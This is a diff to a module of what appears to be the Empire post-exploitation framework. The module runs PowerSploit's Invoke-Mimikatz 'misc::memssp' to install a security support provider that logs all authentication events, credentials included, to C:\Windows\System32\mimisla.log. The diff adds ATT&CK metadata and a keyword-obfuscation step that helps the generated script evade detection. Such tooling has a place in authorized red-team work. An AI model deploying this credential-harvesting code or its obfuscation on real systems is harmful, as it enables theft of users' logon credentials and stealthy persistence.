@@ -1,7 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -15,6 +18,10 @@ class Module(object):
             'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                             "to execute misc::memssp to log all authentication events "
                             "to C:\\Windows\\System32\\mimisla.log."),
+
+            'Software': 'S0194',
+
+            'Techniques': ['T1101'],
 
             'Background' : True,
 
@@ -81,7 +88,10 @@ class Module(object):
         scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"';"
 
         scriptEnd += '"memssp installed, check C:\Windows\System32\mimisla.log for logon events."'
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
